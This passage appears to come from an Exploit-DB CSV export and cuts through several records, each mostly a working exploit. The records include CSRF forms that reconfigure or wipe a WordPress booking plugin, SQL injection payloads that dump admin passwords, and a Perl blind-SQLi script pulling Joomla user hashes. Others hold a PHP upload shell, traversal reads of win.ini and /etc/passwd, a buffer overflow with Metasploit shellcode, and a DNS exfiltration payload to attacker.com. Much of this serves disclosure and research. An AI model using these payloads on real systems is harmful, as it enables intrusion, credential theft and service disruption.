value=""dashboardLibrary"">     <input type=""submit"" value=""Reminder Settings""> </form>  PayPal Settings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     Email: <input type=""text"" name=""uxMerchantEmailAddress"" placeholder=""enter your PayPal email here"">     <input type=""hidden"" name=""uxPayPal"" value=""1"">     <input type=""hidden"" name=""uxPayPalUrl"" value=""https://paypal.com/cgi-bin/webscr"";>     <input type=""hidden"" name=""uxThankyouPageUrl"" value=""http://google.com"";>     <input type=""hidden"" name=""uxCancellationUrl"" value=""http://google.com"";>     <input type=""hidden"" name=""param"" value=""UpdatePaymentGateway"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""PayPal Settings""> </form>  Mailchimp Settings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxMailChimp"" value=""1"">     <input type=""hidden"" name=""uxMailChimpApiKey"" value=""12345678"">     <input type=""hidden"" name=""uxMailChimpUniqueId"" value=""87654321"">     <input type=""hidden"" name=""uxDoubleOptIn"" value=""false"">     <input type=""hidden"" name=""uxWelcomeEmail"" value=""false"">     <input type=""hidden"" name=""param"" value=""UpdateAutoResponder"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Mailchimp Settings""> </form>  Facebook Connect <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxFacebookConnect"" value=""1"">     <input type=""hidden"" name=""uxFacebookAppId"" value=""12345678"">     <input type=""hidden"" name=""uxFacebookSecretKey"" value=""87654321"">     <input type=""hidden"" name=""param"" value=""UpdateFacebookSocialMedia"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Facebook Connect""> </form>  Auto Approve <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""uxAutoApprove"" value=""1"">     <input type=""hidden"" name=""param"" value=""AutoApprove"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Auto Approve""> </form>  Delete All Bookings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""param"" value=""DeleteAllBookings"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Delete All Bookings""> </form>  Restore Factory Settings <form method=""post"" action=""http://www.example.com/wp-admin/admin-ajax.php"";>     <input type=""hidden"" name=""param"" value=""RestoreFactorySettings"">     <input type=""hidden"" name=""action"" value=""dashboardLibrary"">     <input type=""submit"" value=""Restore Factory Settings""> </form>",remote,webapps,1
29080,"BestWebApp Dating Site Login Component - Multiple Field SQL Injections source: https://www.securityfocus.com/bid/21158/info  BestWebApp Dating Site is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues, because it fails to sufficiently sanitize user-supplied input.  An attacker could exploit these issues to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  username = ' or '1' = '1' passwd = ' or '1' = '1'",remote,webapps,1
37876,"Adobe Flash - XMLSocket Destructor Not Cleared Before Setting User Data in connect Source: https://code.google.com/p/google-security-research/issues/detail?id=416&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  This issue is a variant of  issue 192 , which the fix did not address.  If XMLSocket connect is called on an object that already has a destroy function set, such as a BitmapData object, the method will set the user data of that object, but not clear the destroy function. This leads to type confusion when the user data is freed during garbage collection.  A PoC is as follows:  class subsocket extends flash.display.BitmapData{ 	  	public function subsocket(){ 			 	var n = {valueOf : func};     this.valueOf = func; 	var x = new XMLSocket();  	x.connect.call(this, ""127.0.0.1"", this);  }  function func(){  	if(this){ 		} 	this.__proto__ = {};  	this.__proto__.__constructor__ = flash.display.BitmapData; 	super(10, 10, true, 10); 	return 80; 	} 		 		 } 	  A SWF and fla are attached. Note that this PoC needs to be run on a webserver on localhost (or change the IP in the PoC to the server value), and it only crashes in Chrome on 64-bit Linux.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37876.zip",local,dos,0
9713,"Joomla! Component com_jreservation 1.5 - 'pid' Blind SQL Injection #!/usr/bin/perl -w  #--------------------------------------------------------------------------------- #joomla component com_jreservation (pid) Blind SQL Injection Vulnerability #---------------------------------------------------------------------------------  #Author         : Chip D3 Bi0s #Group          : LatiHackTeam #Email          : chipdebios[alt+64]gmail.com #Date           : 17 September 2009 #Critical Lvl   : Moderate #Impact	       : Exposure of sensitive information #Where	       : From Remote #---------------------------------------------------------------------------  #Affected software description: #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  #Application   : JReservation Hotel Booking Component #version       : 1.5 #Developer     : Can & Will #License       : GPL            type  : Commercial #Date Added    : 15 September 2009 #Demo          : http://jforjoomla.com/cd-hotel #Download      : http://www.jforjoomla.com/Download-document.html?gid=47  #Description   :  #Joomla 1.5 Jreservation Component for hotel booking system. #Jreservation is a specially designed component for hotel owners who provides lodging #facility & online booking for the rooms like deluxe, Air conditioned, Non Air conditioned. #By using this Joomla 1.5 Jreservation component you can add multiple room types, amenity  #types like room amenity or property amenity. Amenity are like additional services which the #hotel owner provides with the room e.g. Telephone, internet connection, cable connection and #property amenity like swimming pool, gym, etc. With the help of a calender the user or a  #customer of the hotel can check rooms availability also book room as a provisional booking.  #---------------------------------------------------------------------------   #I.Blind SQL injection (pid) #Poc/Exploit: #~~~~~~~~~~~  #http://127.0.0.1/[path]/index.php?option=com_jreservation&task=propertycpanel&pid=X[blind] #X: Valid pip   #Demo Live: #~~~~~~~~~ #http://www.jforjoomla.com/cd-hotel/index.php?option=com_jreservation&task=propertycpanel&pid=1+and+1=1 #etc, etc...  #+++++++++++++++++++++++++++++++++++++++ #[!] Produced in South America #+++++++++++++++++++++++++++++++++++++++   use LWP::UserAgent; use Benchmark; my $t1 = new Benchmark;   print ""\t\t------------------------------------------------------------\n\n""; print ""\t\t                      |  Chip d3 Bi0s |                     \n\n""; print ""\t\t JReservation Hotel Booking Component                        \n\n""; print ""\t\t Joomla Component com_jreservation (pid) BSQL                \n\n""; print ""\t\t-------------------------------------------------------------\n\n"";   print ""http://localhost/Path       : "";chomp(my $target=<STDIN>); print "" [-] Introduce pid          : "";chomp($z=<STDIN>); print "" [-] Introduce coincidencia : "";chomp($w=<STDIN>);   $column_name=""concat(password)""; $table_name=""jos_users"";   $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');  print ""----------------Inyectando----------------\n"";  #es Vulnerable?   $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+1=1"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {  $host = $target . ""/index.php?option=com_jlord_rss&task=feed&id="".$z.""+and+1=2"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {print "" [-] Exploit Fallo :(\n"";}  else  {print "" [-] Vulnerable :)\n"";  for ($x=1;$x<=32;$x++)  	{    $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))>57"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   print "" [!] "";if($x <= 9 ) {print ""0$x"";}else{print $x;}#para alininear 0..9 con los 10-32    if ($content =~ /$regexp/)   {              for ($c=97;$c<=102;$c++)   {  $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))="".$c."""";  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;    if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print ""-Caracter: $char\n""; $c=102;}  }     } else {  for ($c=48;$c<=57;$c++)   {  $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))="".$c."""";  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print ""-Caracter: $char\n""; $c=57;}  }   }  	} print "" [+] Password   :""."" "".join('', @caracter) . ""\n""; my $t2 = new Benchmark; my $tt = timediff($t2, $t1); print ""El script tomo:"",timestr($tt),""\n"";  } }  else  {print "" [-] Exploit Fallo :(\n"";}  # milw0rm.com [2009-09-17]",remote,webapps,1
29762,"Web Wiz Forums 8.05 - String Filtering SQL Injection source: https://www.securityfocus.com/bid/23051/info   Web Wiz Forums is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  This issue affects versions prior to 8.05a; other versions may also be affected.  <form method=""post"" action=""http://localhost/forum/pop_up_member_search.asp?""> <input type=""hidden"" name=""name"" id=""name"" value=""\""&#039; union select concat(userusernamename,char(58),passpasswordword,char(58),sasaltlt) from tblautauthorhor /*"" > <input type=""submit"" value=""Go""> </form>",remote,webapps,1
23268,"Vivisimo Clustering Engine - Search Script Cross-Site Scripting source: https://www.securityfocus.com/bid/8862/info  Vivisimo Clustering Engine reported prone to cross-site scripting vulnerability. The problem occurs due to insufficient sanitization of parameters passed to the search script. As a result, an attacker may be capable of constructing a link designed to execute arbitrary script code within the browser of a user who follows it.  http://www.example.com/search?query=<script>alert(document.domain)</script>",remote,webapps,1
47423,"Chamillo LMS 1.11.8 - Arbitrary File Upload # Exploit Title: Chamillo LMS 1.11.8 - Arbitrary File Upload  # Google Dork: ""powered by chamilo"" # Date: 2018-10-05 # Exploit Author: Sohel Yousef jellyfish security team # Software Link: https://chamilo.org/en/download/ # Version: Chamilo 1.11.8 or lower to 1.8  # Category: webapps  # 1. Description # Any registered user can upload files and rename and change the file type to  # php5 or php7 by ckeditor module in my files section   # register here : # http://localhost/chamilo//main/auth/inscription.php # after registration you can view this sections  # http://localhost/chamilo/main/social/myfiles.php # http://localhost/chamilo/main/inc/lib/elfinder/filemanager.php?&CKEditor=content&CKEditorFuncNum=0 # upload your shell in gif format and then rename the format  # if the rename function was desabled and add this  GIF89;aGIF89;aGIF89;a   before <?PHP # to be like this for examlple  GIF89;aGIF89;aGIF89;a<html>  <head>   <title>PHP Test</title>   <form action="""" method=""post"" enctype=""multipart/form-data"">   <input type=""file"" name=""fileToUpload"" id=""fileToUpload"">   <input type=""submit"" value=""upload file"" name=""submit"">   </form>  </head>  <body>  <?php echo '<p>FILE UPLOAD</p><br>';  $tgt_dir = ""uploads/"";  $tgt_file = $tgt_dir.basename($_FILES['fileToUpload']['name']);  echo ""<br>TARGET FILE= "".$tgt_file;  //$filename = $_FILES['fileToUpload']['name'];  echo ""<br>FILE NAME FROM VARIABLE:- "".$_FILES[""fileToUpload""][""name""];  if(isset($_POST['submit']))  {  if(file_exists(""uploads/"".$_FILES[""fileToUpload""][""name""]))     { echo ""<br>file exists, try with another name""; }  else   {          echo ""<br>STARTING UPLOAD PROCESS<br>"";         if (move_uploaded_file($_FILES[""fileToUpload""][""tmp_name""], $tgt_file))         { echo ""<br>File UPLOADED:- "".$tgt_file; }            else  { echo ""<br>ERROR WHILE UPLOADING FILE<br>""; }     }  } ?>  </body> </html>  # and uplaod it as php.gif # you can browse the files form right click and click on browse option",remote,webapps,1
46728,"Oracle Business Intelligence 11.1.1.9.0 / 12.2.1.3.0 / 12.2.1.4.0 - Directory Traversal # Exploit Title: Directory traversal in Oracle Business Intelligence # Date: 16.04.19 # Exploit Author: @vah_13 # Vendor Homepage: http://oracle.com # Software Link: https://www.oracle.com/technetwork/middleware/bi-enterprise-edition/downloads/index.html # Version: 11.1.1.9.0, 12.2.1.3.0, 12.2.1.4.0 # Tested on: Windows # CVE : CVE-2019-2588  PoC  http://server:9502/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini",remote,webapps,1
45203,"TP-Link WR840N 0.9.1 3.16 - Denial of Service (PoC) # Exploit Title: TP-Link WR840N 0.9.1 3.16 - Denial of Service (PoC) # Exploit Author:  Aniket Dinda # Date: 2018-08-05 # Vendor Homepage: https://www.tp-link.com/ # Hardware Link:  https://www.amazon.in/TP-LINK-TL-WR840N-300Mbps-Wireless-External/dp/B01A0G1J7Q # Version: TP-Link Wireless N Router WR840N # Firmware version :  0.9.1 3.16 v0001.0 Build 170608 Rel.58696n # Category: Hardware # Tested on: Windows 10 # CVE: CVE-2018-15172  # Proof Of Concept:  1- First connect to this network 2- Open BurpSuite and then start the intercept, making the necessary proxy changes to the internet browser. 3- Goto Quick setup >  4- Now as the Burp is intercept is on, you will find an Authorization: Basic followed by a string.  5- Now we paste a string consisting of 2000 zeros. 6- Then forward the connection 7- Then your router automatically logout and net connection will be gone.",local,dos,0
20217,"RedHat Linux 6.1 i386 - Tmpwatch Recursive Write Denial of Service source: https://www.securityfocus.com/bid/1664/info  Any user with write access to /tmp or /var/tmp, can induce tmpwatch to cause Red Hat (and others runnng tmpwatch from cron) to stop responding, and possibly require a hard reboot. This is accomplished by creating a directory tree many (ie. ~6000) nodes deep in /tmp. For each level of the directory in /tmp, tmpwatch will fork() a new copy of itself.  Red Hat affected versions:  Red Hat Linux 7.0 (tmpwatch v.2.5.1) Red Hat Linux 6.2 (tmpwatch v.2.2)   Note: (excerpted from Internet Security Systems Security Advisory)  ""Source code comparison between the Red Hat Linux 6.2 and 7.0 tmpwatch packages suggests this vulnerability was recognized and a fix was attempted. However, the fix is incorrect, and the vulnerability is still exploitable.  Do not use the --fuser or -s options with tmpwatch.""  ---START---cut---:a.c (mode 644) //  // make lots of directories. // ./a <#of-dirs> // ./a with no arguments to delete dirs. main(int argc,char *argv[]) { int c=0,d=0; if (argc!=2)  { while(!chdir(""./A""))c++; chdir(""..""); printf(""c=%d removing\n"",c); while(!rmdir(""./A"")) {chdir("".."");c--;} if(c)printf(""erm. bad thing.\n""); } else { c=atoi(argv[1]); printf(""c=%d making.\n"",c); while(c--) { mkdir(""./A"",0777); chdir(""./A""); }  } } --END---cut-----:a.c  # ./testscript  (code follows)  ---START---cut---:testscript (mode 755) #!/bin/sh # clear the previous stuff. ./a  rm ./timer.results touch timer.results # create a 1 deep ./a 1 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 100 deep ./a 100 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 200 deep ./a 200 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 300 deep ./a 300 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 400 deep ./a 400 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 500 deep ./a 500 >>timer.results time tmpwatch 240 . 2>>timer.results # create a 600 deep ./a 600 >>timer.results time tmpwatch 240 . 2>>timer.results #tidy up. ./a >>timer.results  --END---cut-----:testscript  If you don't want to test it manually, here you will find the results on the tests on my machine. Who says u need an Athlon with cable or DSL. I say ""Well, it would be nice. Real nice."" I also think this program would probably die faster and more spectacularly on a fast machine with a huge amount of memory and swap space. Oh yeah. Save anything important. And you have to run it as root. (I think. Should probably thought of that. I'll remember it for next time.) The crontab is an effective way of getting it run as root. Which it wants to do anyway. At about 4am everyday.  --START---cut---:timer.results (mode 644) c=1 making. 0.00user 0.01system 0:00.00elapsed 125%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (96major+58minor)pagefaults 0swaps c=100 making. 0.01user 0.19system 0:00.19elapsed 100%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (96major+1797minor)pagefaults 0swaps c=200 making. 0.07user 0.40system 0:00.49elapsed 94%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (96major+3554minor)pagefaults 0swaps c=300 making. 0.10user 0.66system 0:00.76elapsed 99%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (96major+5308minor)pagefaults 0swaps c=400 making. 0.13user 1.33system 0:11.80elapsed 12%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (11766major+9445minor)pagefaults 1263swaps c=500 making. 0.15user 2.11system 0:22.38elapsed 10%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (14104major+13238minor)pagefaults 2699swaps c=600 making. 0.21user 2.81system 0:32.61elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (26066major+17781minor)pagefaults 4109swaps c=600 removing c=600 making. 0.11user 2.88system 0:36.14elapsed 8%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (25741major+17567minor)pagefaults 4009swaps c=700 making. 0.20user 4.24system 0:45.95elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (35562major+22180minor)pagefaults 5542swaps c=800 making. Command terminated by signal 2 0.00user 0.00system 6:01.87elapsed 0%CPU (0avgtext+0avgdata 0maxresident)k 0inputs+0outputs (102major+18minor)pagefaults 10swaps --END---cut-----:timer.results  (System is Cyrix-6x86 @ 187 MHz, 32M physical ram, 64M swap.)  (^C was pressed after about a minute into the 800 deep one. Several system programs died due to memory starvation. It took a quite a while afterwards before the console regained any usabilty. When i tried to run startx, it refused to start. xfs had died. everything looked odd. slow motion. i think it was because of the loadavg)  # uptime 9:00pm up 2:14, 2 users, load average: 202.28, 363.68, 186.46",physical,dos,0
34207,"Customer Paradigm PageDirector - 'id' SQL Injection source: https://www.securityfocus.com/bid/41184/info  Customer Paradigm PageDirector is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?id=UniOn+AlL+SelEct+group_concat(username,0x3e,password)+from+admin--",remote,webapps,1
19483,"IrfanView JLS Formats PlugIn - Heap Overflow Summary =======  IrfanView Formats PlugIn is prone to an overflow condition. The JLS Plugin  (jpeg_ls.dll) library fails to properly sanitize user-supplied input  resulting in a heap-based buffer overflow. With a specially crafted JLS  compressed image file, a context-dependent attacker could potentially  execute arbitrary code.  CVE number: CVE-2012-3585 Impact: high Vendor Homepage: http://www.ifranview.com/ Vendor Notified: 16/06/2012 Found by: Joseph Sheridan of Reaction Information Security href=""http://www.reactionpenetrationtesting.co.uk/joseph-sheridan.html  This advisory is posted at: http://www.reactionpenetrationtesting.co.uk/Irfanview-JLS-Heap-Overflow. html  POC file posted at: http://www.reactionpenetrationtesting.co.uk/vuln.jls https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19483.jls   Affected Products =================  Irfanview Plugins version 4.33  Details =======  IrfanView Formats PlugIn is prone to an overflow condition. The JLS Plugin  (jpeg_ls.dll) library fails to properly sanitize user-supplied input  resulting in a heap-based buffer overflow. With a specially crafted JLS  compressed image file, a context-dependent attacker could potentially  execute arbitrary code.  Impact ======  If a user could be enticed to open a malicious JLS file, the attack could  result in remote code execution.  Solution =========== Upgrade to Irfanview Plugins version 4.34  The following jls dll has been patched: http://www.irfanview.net/plugins/jpeg_ls.zip  Distribution ============  In addition to posting on the website, a text version of this notice is posted to the following e-mail and Usenet news recipients.  * bugtraq () securityfocus com * full-disclosure () lists grok org uk * oss [dash] security [dash] subscribe [at] lists [dot] openwall [dot] com or  Future updates of this advisory, if any, will be placed on the ReactionIS corporate website, but may or may not be actively announced on mailing lists or newsgroups. Users concerned about this problem are encouraged to check the URL below for any updates:  http://www.reactionpenetrationtesting.co.uk/Irfanview-JLS-Heap-Overflow. html  ======================================================================== ======  Reaction Information Security  Lombard House Business Centre, Suite 117, 12-17 Upper Bridge Street, Canterbury, Kent, CT1 2NF  Phone: +44 (0)1227 785050 Email: research () reactionis {dot} co {dot} uk Web: http://www.reactionpenetrationtesting.co.uk  Joseph Sheridan Technical Director Principal Consultant CHECK Team Leader, CREST Infrastructure, CREST Application, CISSP Tel: 07812052515 Web: www.reactionis.com Email: joe (at) reactionis.co (dot) uk [email concealed]  Reaction Information Security Limited. Registered in England No: 6929383 Registered Office: 1, The Mews, 69 New Dover Road, Canterbury, CT1 3DZ  This email and any files transmitted with it are confidential and are intended solely for the use of the individual to whom they are addressed. If you are not the intended recipient please notify the sender. Any unauthorised dissemination or copying of this email or its attachments and any use or disclosure of any information contained in them, is strictly prohibited.  ï Please consider the environment before printing this email",remote,dos,1
29613,"CoolPlayer+ Portable 2.19.4 - Local Buffer Overflow #!/usr/bin/perl  ############################################################################################################ # Exploit Title: CoolPlayer+ Portable v2.19.4 - Local Buffer Overflow # Date: 11-15-2013 # Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift # Vulnerable Software: CoolPlayer+ Portable v2.19.4 # Software Link: http://portableapps.com/apps/music_video/coolplayerp_portable # Version: 2.19.4 # Tested On: Windows XP SP3 # # Credits: Seems various versions of this software have been vulnerable to BOF for a while # -- http://www.exploit-db.com/exploits/4839/ # # Details: Creates an .m3u file for a simple EIP overwrite # -- Buffer is mangled at esp (shellcode size < ~400) so ebx is better choice # -- First overwrite eip with call ebx which points to beginning of buffer # -- Add 300 to ebx to jump past the eip overwrite and into shellcode (available space > 9400) ############################################################################################################  my $buffsize = 10000; # set consistent buffer size  my $jmp = ""\x83\xc3\x64"" x 3; # add 300 to ebx which will jump beyond eip overwrite and into nops/shellcode $jmp = $jmp . ""\xff\xe3""; # jmp ebx  my $junk = ""\x41"" x (260 - length($jmp)); # fill remainder of start of buffer to eip overwrite at offset 260  my $eip = pack('V',0x7c810395); # call ebx [kernel32.dll] which points to start of buffer and our jump code 				# no usable application module found  my $nops = ""\x90"" x 50;  # Calc.exe payload [size 227] # msfpayload windows/exec CMD=calc.exe R |  # msfencode -e x86/shikata_ga_nai -c 1 -b '\x00\x0a\x0d\xff' my $shell = $shell . ""\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9"" . ""\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92"" . ""\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84"" . ""\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e"" . ""\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1"" . ""\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27"" . ""\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb"" . ""\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b"" . ""\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2"" . ""\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37"" . ""\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3"" . ""\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef"" . ""\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb"" . ""\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf"" . ""\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83"" . ""\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3"" . ""\x9a\xca\xc0"";  my $sploit = $jmp.$junk.$eip.$nops.$shell; # build sploit portion of buffer my $fill = ""\x43"" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency my $buffer = $sploit.$fill; # build final buffer  # write the exploit buffer to file my $file = ""coolplayer.m3u""; open(FILE, "">$file""); print FILE $buffer; close(FILE); print ""Exploit file ["" . $file . ""] created\n""; print ""Buffer size: "" . length($buffer) . ""\n"";",local,dos,1
31177,"MW6 Technologies Datamatrix - ActiveX 'Data' Buffer Overflow <!-- =========================================================================== Problem: The Data parameter is subject to a buffer overflow PROBABLY leading to arbitrary code execution. COM Object - {DE7DA0B5-7D7B-4CEA-8739-65CF600D511E} MW6DataMatrix Class File Description    : DataMatrix ActiveX File Version        : 4, 0, 0, 1 To trigger the overflow enter a string larger than 10000 characters. This one I'm not 100% sure if I can control. The attached PoC (mw6datamatrix.html) dies with the following message:  DATAMA_1!DllUnregisterServer+0xac5f: 02fbbcea 668984566c5c0100 mov     word ptr [esi+edx*2+15C6Ch],ax ds:0023:03006000=????  The !exploitable windbg plugin says:  Exploitability Classification: EXPLOITABLE Recommended Bug Title: Exploitable - User Mode Write AV starting at DATAMA_1!DllUnregisterServer+0x000000000000ac5f (Hash=0x3a50672d.0x5d486a2f) User mode write access violations that are not near NULL are exploitable.  So the buffer overflow might be exploitable by someone  willing to spend more time on this.  COM Object - {DE7DA0B5-7D7B-4CEA-8739-65CF600D511E} MW6DataMatrix Class ******************************************************************************* COM Object Filename : C:\WINDOWS\system32\DATAMA~1.DLL Major Version       : 4 Minor Version       : 0 Build Number        : 0 Revision Number     : 1 Product Version     : 4, 0, 0, 1 Product Name        : DataMatrix Module Company Name        : MW6 Technologies, Inc. Legal Copyright     : MW6 Technologies, Inc. Comments            :  File Description    : DataMatrix ActiveX File Version        : 4, 0, 0, 1 Internal Name       : DataMatrix Legal Trademarks    :  Private Build       :  Special Build       :  Language            : not found ******************************************************************************* --> <object id=TestObj classid=""CLSID:{DE7DA0B5-7D7B-4CEA-8739-65CF600D511E}"" style=""width:100;height:350""> <PARAM NAME=""Data"" VALUE=""""> </object>",local,dos,1
28684,"Gnew 2013.1 - Multiple Vulnerabilities (2) Advisory ID: HTB23171 Product: Gnew Vendor: Raoul ProenÃ§a Vulnerable Version(s): 2013.1 and probably prior Tested Version: 2013.1 Advisory Publication: August 28, 2013 [without technical details] Vendor Notification: August 28, 2013 Public Disclosure: October 2, 2013 Vulnerability Type: PHP File Inclusion [CWE-98], SQL Injection [CWE-89] CVE References: CVE-2013-5639, CVE-2013-5640 Risk Level: High CVSSv2 Base Scores: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C), 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P) Solution Status: Solution Available Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )  ------------------------------------------------------------------------ -----------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in Gnew, which can be exploited to execute arbitrary PHP code and pefrom SQL injection attacks against vulnerable application.  1) PHP File Inclusion in Gnew: CVE-2013-5639  Vulnerability exists due to insufficient validation of user-supplied input passed via the ""gnew_language"" cookie to ""/users/login.php"" script before using it in ""include()"" function. A remote attacker can include and execute arbitrary local files on a vulnerable system via directory traversal sequence and URL-encoded NULL byte.  The following exploitation example below displays content of the ""/etc/passwd"" file:  GET /users/login.php HTTP/1.1 Cookie: gnew_language=../../../etc/passwd%00;  2) SQL Injection in Gnew: CVE-2013-5640  2.1 The vulnerability exists due to insufficient filtration of ""friend_email"" HTTP POST parameter passed to ""/news/send.php"" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.  The following exploitation example sends MySQL server version and database username to email address ""attacker (at) mail (dot) com [email concealed]"":  <form action=""http://[host]/news/send.php"" method=""post"" name=""main""> <input type=""hidden"" name=""send"" value=""1""> <input type=""hidden"" name=""user_name"" value=""username""> <input type=""hidden"" name=""user_email"" value=""user (at) mail (dot) com [email concealed]""> <input type=""hidden"" name=""friend_email"" value=""attacker (at) mail (dot) com [email concealed]""> <input type=""hidden"" name=""news_id"" value=""-1' UNION SELECT version(),user() -- ""> <input type=""submit"" id=""btn""> </form>  2.2 The vulnerability exists due to insufficient filtration of ""user_email"" HTTP POST parameter passed to ""/users/register.php"" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.  The exploitation example below outputs database username and MySQL server version into file ""/var/www/file.txt"". Successful exploitation requires that MySQL server has write access to the ""/var/www"" directory.  <form action=""http://[host]/users/register.php"" method=""post"" name=""main""> <input type=""hidden"" name=""register"" value=""1""> <input type=""hidden"" name=""user_email"" value=""' UNION SELECT user(),version() INTO OUTFILE '/var/www/file.txt' -- 2""> <input type=""submit"" id=""btn""> </form>  2.3 The vulnerability exists due to insufficient filtration of ""answer_id"" HTTP POST parameter passed to ""/polls/vote.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/polls/vote.php"" method=""post"" name=""main""> <input type=""hidden"" name=""add_vote"" value=""1""> <input type=""hidden"" name=""answer_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""hidden"" name=""question_id"" value=""1""> <input type=""submit"" id=""btn""> </form>  2.4 The vulnerability exists due to insufficient filtration of ""question_id"" HTTP POST parameter 